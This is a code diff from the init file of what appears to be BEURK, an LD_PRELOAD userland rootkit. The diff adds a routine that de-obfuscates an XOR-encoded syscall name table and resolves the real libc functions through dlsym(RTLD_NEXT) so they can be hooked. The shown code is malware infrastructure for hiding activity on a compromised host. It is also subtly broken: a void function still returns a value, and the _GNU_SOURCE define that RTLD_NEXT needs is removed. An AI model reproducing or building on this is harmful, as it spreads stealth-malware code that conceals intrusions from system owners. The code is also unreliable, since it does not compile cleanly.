@@ -23,20 +23,19 @@
 */
 
 #include <string.h>
-#define _GNU_SOURCE /* for RTLD_NEXT macro in dlfcn.h */
 #include <dlfcn.h>
 #include "beurk.h"
 
 /** xorify a string whith XOR_KEY
  * (XOR_KEY is a macro defined in BEURK config file
  */
-static char     *xor(char *p) {
+static void     xor(char *p) {
     unsigned int i;
 
     for(i = 0; i < strlen(p); i++) {
         p[i] ^= XOR_KEY;
     }
-	return p;
+    return p;
 }
 
 /** re-xorify hidden literals.
@@ -55,29 +54,40 @@ static void     init_hidden_literals(void) {
     }
 }
 
+/** re-xorify syscalls table.
+ */
+static void     init_syscalls_table(void) {
+    int     i;
+
+    for (i=0; i<NUM_SYSCALLS; i++) {
+        xor(beurk_syscalls_table[i]);
+    }
+}
+
 /** initializes the global array beurk_syscalls_list
  * if dlsym fail, and DEBUG_MODE is activating, a error message
  * is print.
 */
-static void		init_syscalls_list() {
-	int		i;
-	char	*syscall;
-	char	*dl_error;
+static void     init_syscalls_list() {
+    int  i;
+    char *syscall;
+    char *dl_error;
 
-	dlerror();
-	for (i = 0; i < NUM_SYSCALL; i++) {
-		syscall = xor(beurk_syscalls_table[i]);
-		beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
-		if ((dl_error = dlerror()) != NULL)
-			DEBUG(dl_error);
-	}
+    dlerror();
+    for (i = 0; i < NUM_SYSCALLS; i++) {
+        syscall = beurk_syscalls_table[i];
+        beurk_syscalls_list[i] = dlsym(RTLD_NEXT, syscall);
+        if ((dl_error = dlerror()) != NULL)
+            DEBUG(dl_error);
+    }
 }
 
 /** library constructor
  */
 void        init(void)
 {
-    DEBUG("init() constructor loaded");
     init_hidden_literals();
-	init_syscalls_list();
+    init_syscalls_table();
+    init_syscalls_list();
+    DEBUG("init() constructor loaded");
 }
